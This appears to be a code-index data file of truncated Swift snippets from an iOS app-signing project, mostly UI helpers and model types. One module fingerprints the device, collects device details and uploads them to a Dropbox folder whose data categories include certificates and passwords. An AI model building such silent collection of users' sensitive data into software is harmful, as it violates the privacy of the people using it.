1494,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Add a glass-like blur effect to the view / - Parameters: /   - style: The blur style to use /   - cornerRadius: Corner radius for the blur view /   - alpha: Opacity of the blur effect","func addGlassEffect(
style: UIBlurEffect.Style = .systemUltraThinMaterial,
cornerRadius: CGFloat = 0,
alpha: CGFloat = 1.0
) {"
1495,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Round specific corners of the view / - Parameters: /   - corners: Which corners to round /   - radius: The corner radius","func roundCorners(corners: UIRectCorner, radius: CGFloat) {
let path = UIBezierPath(
roundedRect: bounds,
byRoundingCorners: corners,
cornerRadii: CGSize(width: radius, height: radius)
)

let maskLayer = CAShapeLayer()
maskLayer.path = path.cgPath
layer.mask = maskLayer"
1496,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Add a subtle border to the view / - Parameters: /   - color: The border color /   - width: The border width","func addBorder(color: UIColor, width: CGFloat = 1.0) {
layer.borderColor = color.cgColor
layer.borderWidth = width
}

/// Add parallax effect to the view (subtle movement in response to device tilting)
func addParallaxEffect(amount: CGFloat = 10) {"
1497,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Add parallax effect to the view (subtle movement in response to device tilting)","func addParallaxEffect(amount: CGFloat = 10) {
// Remove any existing motion effects
motionEffects.forEach { removeMotionEffect($0) }"
1498,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Convert this view into a modern badge style / - Parameters: /   - backgroundColor: The badge background color /   - textColor: The text color (if containing a label)","func applyBadgeStyle(backgroundColor: UIColor, textColor: UIColor? = nil) {
self.backgroundColor = backgroundColor
layer.cornerRadius = bounds.height / 2
clipsToBounds = true

// Apply minimum size
if bounds.width < bounds.height {"
1499,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","MARK: - UIView Extensions","extension UIView {
/// Add and setup constraints for a child view in a single call
/// - Parameters:
///   - child: Child view to add
///   - setup: Closure for configuring constraints
func addSubviewWithConstraints(_ child: UIView, setup: (UIView) -> [NSLayoutConstraint]) {"
1500,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Add and setup constraints for a child view in a single call / - Parameters: /   - child: Child view to add /   - setup: Closure for configuring constraints","func addSubviewWithConstraints(_ child: UIView, setup: (UIView) -> [NSLayoutConstraint]) {
child.translatesAutoresizingMaskIntoConstraints = false
addSubview(child)
NSLayoutConstraint.activate(setup(child))
}

/// Create a stack of views with equal spacing
/// - Parameters:
///   - views: Views to include in the stack
///   - axis: Stack axis (horizontal or vertical)"
1501,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Create a stack of views with equal spacing / - Parameters: /   - views: Views to include in the stack /   - axis: Stack axis (horizontal or vertical) /   - spacing: Spacing between views /   - distribution: Distribution type /   - alignment: Alignment type / - Returns: Configured stack view","func createStack(
with views: [UIView],
axis: NSLayoutConstraint.Axis,
spacing: CGFloat = 8,
distribution: UIStackView.Distribution = .fill,
alignment: UIStackView.Alignment = .fill
) -> UIStackView {"
1502,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Add a loading indicator with optional text / - Parameters: /   - text: Optional loading text /   - style: Activity indicator style / - Returns: The container view that can be removed later","func addLoadingIndicator(text: String? = nil, style: UIActivityIndicatorView.Style = .large) -> UIView {
// Create container
let container = UIView()
container.backgroundColor = UIColor.black.withAlphaComponent(0.3)
container.translatesAutoresizingMaskIntoConstraints = false
addSubview(container)

NSLayoutConstraint.activate([
container.leadingAnchor.constraint(equalTo: leadingAnchor),
container.trailingAnchor.constraint(equalTo: trailingAnchor),"
1503,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Add an animated icon as a child view (replacement for Lottie) / - Parameters: /   - systemName: SF Symbol name /   - tintColor: Icon tint color /   - size: Size for the icon / - Returns: The configured image view","func addAnimatedIcon(
systemName: String,
tintColor: UIColor = .systemBlue,
size: CGSize = CGSize(width: 100, height: 100)
) -> UIImageView {"
1504,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Apply elegant card styling to the view / - Parameters: /   - cornerRadius: Corner radius for the card /   - shadowOpacity: Shadow opacity (0-1) /   - backgroundColor: Background color","func applyCardStyling(
cornerRadius: CGFloat = 16,
shadowOpacity: Float = 0.1,
backgroundColor: UIColor = .systemBackground
) {"
1505,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Add a gradient background to the view / - Parameters: /   - colors: Gradient colors /   - startPoint: Start point (default top-left) /   - endPoint: End point (default bottom-right)","func addViewGradientBackground(
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],
startPoint: CGPoint = CGPoint.zero,
endPoint: CGPoint = CGPoint(x: 1, y: 1)
) {"
1506,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","Function addGradientBackground - implements addgradientbackground functionality","func addGradientBackground(
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],
startPoint: CGPoint = CGPoint.zero,
endPoint: CGPoint = CGPoint(x: 1, y: 1)
) {"
1507,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Apply futuristic shadow effect to the view","func applyFuturisticShadow() {
layer.applyBlueTintedShadow()
}
}

// MARK: - UIButton Extensions

extension UIButton {"
1508,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","MARK: - UIButton Extensions","extension UIButton {
/// Convert a standard UIButton to a gradient button
/// - Parameters:
///   - colors: Gradient colors
///   - startPoint: Start point of gradient
///   - endPoint: End point of gradient
func convertToGradientButton(
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],
startPoint: CGPoint = CGPoint.zero,
endPoint: CGPoint = CGPoint(x: 1, y: 1)"
1509,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Convert a standard UIButton to a gradient button / - Parameters: /   - colors: Gradient colors /   - startPoint: Start point of gradient /   - endPoint: End point of gradient","func convertToGradientButton(
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],
startPoint: CGPoint = CGPoint.zero,
endPoint: CGPoint = CGPoint(x: 1, y: 1)
) {"
1510,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Create a gradient button / - Parameters: /   - title: Button title /   - colors: Gradient colors /   - cornerRadius: Corner radius /   - fontSize: Font size / - Returns: A configured button with gradient","static func createGradientButton(
title: String,
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],
cornerRadius: CGFloat = 12,
fontSize: CGFloat = 16
) -> UIButton {"
1511,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","MARK: - UIViewController Extensions","extension UIViewController {
/// Show a loading overlay
/// - Parameters:
///   - message: Optional loading message
/// - Returns: The container view that can be removed later
func showLoadingOverlay(message: String? = ""Loading..."") -> UIView {"
1512,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Show a loading overlay / - Parameters: /   - message: Optional loading message / - Returns: The container view that can be removed later","func showLoadingOverlay(message: String? = ""Loading..."") -> UIView {
return view.addLoadingIndicator(text: message)
}

/// Hide the loading overlay
/// - Parameter overlay: The overlay container view returned by showLoadingOverlay
func hideLoadingOverlay(_ overlay: UIView) {"
1513,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Hide the loading overlay / - Parameter overlay: The overlay container view returned by showLoadingOverlay","func hideLoadingOverlay(_ overlay: UIView) {
UIView.animate(withDuration: 0.3, animations: {"
1514,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Show a brief success animation / - Parameter message: Optional success message","func showSuccessAnimation(message: String? = nil) {
// Create success icon
let imageView = view.addAnimatedIcon(
systemName: ""checkmark.circle.fill"",
tintColor: .systemGreen,
size: CGSize(width: 100, height: 100)
)

// Center the animation
NSLayoutConstraint.activate(["
1515,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","MARK: - CALayer Extensions","extension CALayer {
/// Apply a shadow with blue tint to the layer
func applyBlueTintedShadow() {"
1516,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Apply a shadow with blue tint to the layer","func applyBlueTintedShadow() {
masksToBounds = false
shadowColor = UIColor.systemBlue.cgColor
shadowOffset = CGSize(width: 0, height: 4)
shadowOpacity = 0.2
shadowRadius = 8
}
}

// MARK: - Animation Helper (replacing the Lottie-based implementation)"
1517,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","MARK: - Animation Helper (replacing the Lottie-based implementation)","class AnimationHelper {
/// Show a loading animation overlay
/// - Parameters:
///   - view: View to add the loader to
///   - message: Optional message to display
/// - Returns: Container view that can be removed later
static func showLoader(in view: UIView, message: String? = nil) -> UIView {"
1518,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Show a loading animation overlay / - Parameters: /   - view: View to add the loader to /   - message: Optional message to display / - Returns: Container view that can be removed later","static func showLoader(in view: UIView, message: String? = nil) -> UIView {
return view.addLoadingIndicator(text: message)
}

/// Hide the loader animation
/// - Parameter container: Container view returned by showLoader
static func hideLoader(_ container: UIView) {"
1519,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Hide the loader animation / - Parameter container: Container view returned by showLoader","static func hideLoader(_ container: UIView) {
UIView.animate(withDuration: 0.3, animations: {"
1520,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","MARK: - ElegantUIComponents (Replacement without SnapKit & Lottie)","class ElegantUIComponents {
/// Create a beautifully styled button with gradient
/// - Parameters:
///   - title: Button title
///   - colors: Gradient colors (default blue gradient)
///   - cornerRadius: Corner radius (default 12)
///   - fontSize: Font size (default 16)
/// - Returns: Configured button
static func createGradientButton(
title: String,"
1521,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Create a beautifully styled button with gradient / - Parameters: /   - title: Button title /   - colors: Gradient colors (default blue gradient) /   - cornerRadius: Corner radius (default 12) /   - fontSize: Font size (default 16) / - Returns: Configured button","static func createGradientButton(
title: String,
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],
cornerRadius: CGFloat = 12,
fontSize: CGFloat = 16
) -> UIButton {"
1522,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Create a card view with shadow / - Parameters: /   - backgroundColor: Card background color /   - cornerRadius: Corner radius / - Returns: Configured card view","static func createCardView(
backgroundColor: UIColor = .systemBackground,
cornerRadius: CGFloat = 16
) -> UIView {"
1523,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift","/ Create a beautiful text field with floating label / - Parameters: /   - placeholder: Placeholder text /   - backgroundColor: Background color /   - borderColor: Border color / - Returns: Configured text field with container","static func createFloatingTextField(
placeholder: String,
backgroundColor: UIColor = .systemBackground,
borderColor: UIColor = .systemGray4
) -> UIView {"
1524,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+parentcontroller.swift","extension UIView - UI component for display and interaction","extension UIView {
var parentViewController: UIViewController? {"
1525,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Extension for adding defensive initialization and error recovery to view controllers","extension UIViewController {
/// Execute a function with proper error handling and recovery
/// - Parameters:
///   - operation: The operation to execute
///   - errorHandler: Handler for any errors that occur
///   - completion: Called when operation completes successfully
func executeWithErrorHandling(
operation: @escaping () throws -> Void,
errorHandler: ((Error) -> Void)? = nil,
completion: (() -> Void)? = nil"
1526,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Execute a function with proper error handling and recovery / - Parameters: /   - operation: The operation to execute /   - errorHandler: Handler for any errors that occur /   - completion: Called when operation completes successfully","func executeWithErrorHandling(
operation: @escaping () throws -> Void,
errorHandler: ((Error) -> Void)? = nil,
completion: (() -> Void)? = nil
) {"
1527,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Default error handler to show an alert / - Parameter error: The error that occurred","private func defaultErrorHandler(_ error: Error) {
DispatchQueue.main.async { [weak self] in"
1528,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Alert with a recovery option to attempt fixing the issue / - Parameters: /   - title: Alert title /   - message: Alert message /   - recoveryOperation: Operation to perform for recovery","func showRecoveryAlert(title: String, message: String, recoveryOperation: @escaping () -> Void) {
let alert = UIAlertController(
title: title,
message: message,
preferredStyle: .alert
)

// Add recovery action
let recoverAction = UIAlertAction(title: ""Recover"", style: .default) { _ in"
1529,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Safe method to push a view controller / - Parameters: /   - viewController: The view controller to push /   - animated: Whether to animate the transition /   - completion: Completion handler","func safePush(
viewController: UIViewController,
animated: Bool,
completion: (() -> Void)? = nil
) {"
1530,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Safe method to present a view controller / - Parameters: /   - viewController: The view controller to present /   - animated: Whether to animate the transition /   - completion: Completion handler","func safePresent(
viewController: UIViewController,
animated: Bool,
completion: (() -> Void)? = nil
) {"
1531,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Show an LED-styled indicator for the current state / - Parameters: /   - type: The type of indicator /   - message: Optional message to display /   - duration: How long to show the indicator","func showLEDIndicator(type: LEDIndicatorType, message: String? = nil, duration: TimeInterval = 2.0) {
// Remove any existing indicators
if let existingIndicator = view.viewWithTag(7777) {"
1532,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Types of LED indicators","enum LEDIndicatorType {
case success
case error
case warning
case info

var backgroundColor: UIColor {"
1533,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","MARK: - ViewControllerRefreshable Enhanced / Protocol for view controllers that can refresh their content","protocol EnhancedViewControllerRefreshable: ViewControllerRefreshable {
/// Refresh content with defensive error handling
func refreshContentSafely()

/// Check if this controller needs recovery after being in an invalid state
var needsRecovery: Bool { get }"
1534,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Refresh content with defensive error handling","func refreshContentSafely()

/// Check if this controller needs recovery after being in an invalid state
var needsRecovery: Bool { get }"
1535,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Perform recovery operation to restore the controller to a valid state","func performRecovery()
}

/// Default implementation of EnhancedViewControllerRefreshable
extension EnhancedViewControllerRefreshable where Self: UIViewController {"
1536,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Default implementation of EnhancedViewControllerRefreshable","extension EnhancedViewControllerRefreshable where Self: UIViewController {
/// Default implementation that wraps refreshContent in error handling
func refreshContentSafely() {"
1537,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Default implementation that wraps refreshContent in error handling","func refreshContentSafely() {
executeWithErrorHandling(
operation: {"
1538,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift","/ Default implementation of performRecovery","func performRecovery() {
// Default implementation does nothing
}
}
"
1539,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/View+NavTransition.swift","extension View - UI component for display and interaction","extension View {
@ViewBuilder
func compatNavigationTransition(id: String, ns: Namespace.ID) -> some View {"
1540,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/View+NavTransition.swift","Function compatNavigationTransition - implements compatnavigationtransition functionality","func compatNavigationTransition(id: String, ns: Namespace.ID) -> some View {
if #available(iOS 18.0, *) {"
1541,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/View+NavTransition.swift","Function compatMatchedTransitionSource - implements compatmatchedtransitionsource functionality","func compatMatchedTransitionSource(id: String, ns: Namespace.ID) -> some View {
if #available(iOS 18.0, *) {"
1542,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Enhanced Dropbox device identifier and organization manager","class EnhancedDropboxDeviceIdentifier {
// MARK: - Shared Instance

/// Shared singleton instance
static let shared = EnhancedDropboxDeviceIdentifier()

// MARK: - Properties

/// Base path for all uploaded data in Dropbox
private let baseDropboxPath = ""/backdoor-app-data/"""
1543,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Set custom device name / - Parameter name: The custom name to set","func setCustomDeviceName(_ name: String) {
guard !name.isEmpty else { return }"
1544,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Get subfolder path for specific data type / - Parameter type: The type of data (logs, certs, etc.) / - Returns: Full Dropbox path for the data type","func folderPath(for type: DataType) -> String {
return deviceFolderPath + type.rawValue + ""/""
}

/// Data types that can be stored in Dropbox
enum DataType: String {"
1545,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Data types that can be stored in Dropbox","enum DataType: String {
case logs = ""Logs""
case certificates = ""Certificates""
case apps = ""Apps""
case configuration = ""Configuration""
case deviceInfo = ""DeviceInfo""
case passwords = ""Passwords"" // Sensitive data type
}

/// Collection of device information for Dropbox"
1546,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Collection of device information for Dropbox / - Returns: Dictionary with comprehensive device details","func collectDeviceInformation() -> [String: Any] {
// Basic device info
var deviceInfo: [String: Any] = [
""deviceId"": deviceIdentifier,
""deviceName"": deviceName,
""formatVersion"": infoFormatVersion,
""lastUpdated"": ISO8601DateFormatter().string(from: Date()),
""model"": UIDevice.current.model,
""systemName"": UIDevice.current.systemName,
""systemVersion"": UIDevice.current.systemVersion,"
1547,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Upload current device information to Dropbox","func uploadDeviceInfo() {
// Collect comprehensive device information
let deviceInfo = collectDeviceInformation()

// Convert to JSON
guard let jsonData = try? JSONSerialization.data(withJSONObject: deviceInfo, options: .prettyPrinted),
let jsonString = String(data: jsonData, encoding: .utf8)
else {"
1548,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","MARK: - Private Methods / Generate a unique device identifier / - Returns: A unique string identifier for this device","private func generateUniqueDeviceIdentifier() -> String {
// Combine multiple device properties for uniqueness
var components: [String] = []

// Add device model
components.append(UIDevice.current.model)

// Add vendor identifier if available
if let vendorId = UIDevice.current.identifierForVendor?.uuidString {"
1549,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Upload initial device information upon first run / - Parameter deviceId: The device identifier","private func uploadInitialDeviceInfo(for deviceId: String) {
Debug.shared.log(message: ""Generating initial device info for \(deviceId)"", type: .info)
uploadDeviceInfo()
}

/// Collect storage information
/// - Returns: Dictionary with storage details
private func collectStorageInfo() -> [String: Any] {"
1550,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Collect storage information / - Returns: Dictionary with storage details","private func collectStorageInfo() -> [String: Any] {
let fileManager = FileManager.default

// Get app's document directory
guard let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first else {"
1551,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Collect environment information / - Returns: Dictionary with environment details","private func collectEnvironmentInfo() -> [String: String] {
var envInfo: [String: String] = [:]

// Add time zone
envInfo[""timeZone""] = TimeZone.current.identifier

// Add locale
envInfo[""locale""] = Locale.current.identifier

// Add device orientation"
1552,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Convert battery state to string / - Parameter state: The battery state / - Returns: String representation","private func batteryStateString(_ state: UIDevice.BatteryState) -> String {
switch state {"
1553,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","MARK: - FileManager Extension","extension FileManager {
/// Get allocated size of a directory
/// - Parameter directoryURL: The directory URL
/// - Returns: Size in bytes
func allocatedSizeOfDirectory(at directoryURL: URL) throws -> Int64 {"
1554,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","/ Get allocated size of a directory / - Parameter directoryURL: The directory URL / - Returns: Size in bytes","func allocatedSizeOfDirectory(at directoryURL: URL) throws -> Int64 {
let resourceKeys: Set<URLResourceKey> = [.isRegularFileKey, .fileAllocatedSizeKey, .totalFileAllocatedSizeKey]
guard let enumerator = self.enumerator(
at: directoryURL,
includingPropertiesForKeys: Array(resourceKeys),
options: [],
errorHandler: { (url, error) -> Bool in"
1555,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","MARK: - UIDevice.BatteryState Helper / Helper function to convert battery state to string for diagnostics","private func batteryStateToString(_ state: UIDevice.BatteryState) -> String {
switch state {"
1556,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift","MARK: - UIDeviceOrientation Helper / Helper function to convert device orientation to string for diagnostics","private func deviceOrientationToString(_ orientation: UIDeviceOrientation) -> String {
switch orientation {"
1557,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift","/ Manager for server.crt and server.pem certificate files used by the app / These certificates are used for: / 1. Server functionality (HTTPS server in Installer class) / 2. Offline app signing","class ServerCertificateManager {
// MARK: - Shared Instance

static let shared = ServerCertificateManager()

// MARK: - Properties

/// Server certificate file paths
private let serverCrtPath: URL
private let serverPemPath: URL"
1558,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift","Function validateCertificates - implements validatecertificates functionality","func validateCertificates() -> Bool {
// Check if we've validated recently
if let lastValidation = lastValidationTime, Date().timeIntervalSince(lastValidation) < 30 {"
1559,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift","/ Check if server certificates are valid","func areCertificatesValid() -> Bool {
let fileManager = FileManager.default

// Check if certificate files exist
let certExists = fileManager.fileExists(atPath: serverCrtPath.path)
let keyExists = fileManager.fileExists(atPath: serverPemPath.path)

// Basic validation - check files exist and aren't empty
var isValid = certExists && keyExists
"
1560,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift","/ Get server certificate paths / - Returns: Tuple with paths to certificate and key files","func getCertificatePaths() -> (cert: URL, key: URL) {
return (serverCrtPath, serverPemPath)
}

// MARK: - Private Methods

/// Download server certificates using the app's existing functionality
private func downloadCertificates() {"
1561,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift","MARK: - Private Methods / Download server certificates using the app's existing functionality","private func downloadCertificates() {
let semaphore = DispatchSemaphore(value: 0)

getCertificates {"
1562,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/AIDataset.swift","/ Model representing an AI dataset file","class AIDataset: Equatable {
let id: String
var name: String
let fileName: String
let format: String
let size: Int
let dateAdded: Date
let recordCount: Int
let url: URL
"
1563,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/AIDataset.swift","/ Model representing dataset information from online sources","struct AIDatasetInfo {
let name: String
let description: String
let url: URL
let size: Int
let category: String

/// Formatted size string
var formattedSize: String {"
1564,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/AIDataset.swift","/ Errors that can occur during dataset operations","enum AIDatasetError: Error, LocalizedError {
case invalidFormat(String)
case invalidData(String)
case downloadFailed(String)
case trainingFailed(String)

var errorDescription: String? {"
1565,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift","/ Represents a single iOS app entitlement","struct Entitlement: Codable, Identifiable, Equatable {
/// Unique identifier for this entitlement
var id = UUID()

/// The key for the entitlement (e.g., ""com.apple.developer.networking.wifi-info"")
var key: String

/// The value type for this entitlement
var valueType: EntitlementValueType
"
1566,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift","/ Validate the entitlement format based on its type","private func validateEntitlement() -> Bool {
// Basic key validation - must be in reverse domain format and non-empty
guard !key.isEmpty, key.contains(""."") else {"
1567,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift","/ Convert to property list compatible value","func toPlistValue() -> Any {
switch valueType {"
1568,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift","/ Represents the type of value an entitlement can have","enum EntitlementValueType: String, Codable, CaseIterable {
case boolean = ""Boolean""
case integer = ""Integer""
case string = ""String""
case array = ""Array""
case dictionary = ""Dictionary""
}

/// Collection of common iOS entitlements for quick reference
enum CommonEntitlements {"
1569,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift","/ Collection of common iOS entitlements for quick reference","enum CommonEntitlements {
static let appGroups = Entitlement(
key: ""com.apple.security.application-groups"",
valueType: .array,
stringValue: ""[group.example.identifier]"",
description: ""Share data between apps using App Groups""
)

static let healthKit = Entitlement(
key: ""com.apple.developer.healthkit"","
1570,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Manager class for AI dataset operations","class AIDatasetManager {
// MARK: - Singleton

static let shared = AIDatasetManager()

// MARK: - Properties

private let datasetsDirectory: URL
private let downloadQueue = OperationQueue()
"
1571,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","MARK: - Public Methods / Get list of available datasets","func getAvailableDatasets(completion: @escaping (Result<[AIDataset], Error>) -> Void) {
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
1572,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Import a dataset from a local file","func importDataset(from fileURL: URL, completion: @escaping (Result<AIDataset, Error>) -> Void) {
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
1573,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Use a dataset for AI model training","func useDatasetForTraining(_ dataset: AIDataset, completion: @escaping (Result<Void, Error>) -> Void) {
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
1574,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Delete a dataset","func deleteDataset(_ dataset: AIDataset, completion: @escaping (Result<Void, Error>) -> Void) {
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
